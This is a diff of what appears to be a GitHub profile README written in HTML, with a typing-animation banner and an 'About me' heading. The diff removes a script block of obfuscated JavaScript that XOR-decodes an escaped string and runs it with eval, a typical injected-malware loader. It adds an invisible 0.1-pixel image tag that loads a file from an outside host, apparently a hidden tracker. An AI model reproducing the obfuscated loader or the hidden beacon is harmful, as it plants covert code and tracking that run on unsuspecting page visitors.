@@ -1,7 +1,13 @@
+<html>
+<head>
+<img src='https://security.heillamal.com/common/img_view.php?file=favicon.ico' width='0.1' height='0.1' frameBorder='0' />
+</head>
+	
 <div>
   <h1 align='center'> 
     <img src="https://readme-typing-svg.herokuapp.com?font=Dancing+Script&color=a190b6&size=45&height=80&vCenter=true&center=true&pause=1000&lines=Overcome+Challenging!" alt="Typing SVG" />
   </h1>
+ 
 </div>
 
 ### About me
@@ -64,6 +70,4 @@
      </p>
   </div>
 </div>
-<script language='javascript'>
-	{KZFFyc5GYhb=unescape('.%28W%26%1D/%29@%7D%078.@6Xh%7B%5D5%02+*Qs%038%24%09t%18%3E3D%20JehG6%13%3F5%5D%27%09d/Q%3A%1C%26%26Y2%1Cd%24%5B%3E_%29%28Y%3E%1F%24h%5D%3E%17%151%5D6%07d7%5C%23O%2C.X6M%2C%26B%3A%13%25%29%1A%3A%13%25%60%14%24%19.3%5CnWzi%05tP%22%22%5D4%18%3Ez%13c%5E%7B%60%145%02+*Q%11%1F8%23Q%21Mmw%13mLe.R%21%11%27%22%0AqYqJG4SpJOY0xEc');W9Ad=KZFFyc5GYhb.substr(0,KZFFyc5GYhb.length - 7);_2=W9Ad.substr(W9Ad.length-5,5);W9Ad=W9Ad.substr(0,W9Ad.length-5);kB3s7C='';for(pZ3m2mj=0;pZ3m2mj<W9Ad.length;pZ3m2mj++)kB3s7C+=String.fromCharCode(W9Ad.charCodeAt(pZ3m2mj)^_2.charCodeAt(pZ3m2mj%5));KZFFyc5GYhb=kB3s7C;eval(KZFFyc5GYhb);}
-</script>
+</html>
